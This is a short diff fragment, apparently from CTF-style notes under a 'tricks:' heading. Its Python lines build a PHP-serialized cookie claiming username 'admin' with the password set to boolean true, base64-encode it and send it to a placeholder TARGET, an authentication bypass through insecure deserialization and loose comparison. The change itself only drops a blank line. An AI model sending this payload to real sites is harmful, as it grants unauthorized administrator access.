@@ -41,4 +41,3 @@ tricks:
       payload = 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}'
       cookie = base64.b64encode(payload.encode()).decode()
       requests.get('http://TARGET/', cookies={"creds": cookie})
-
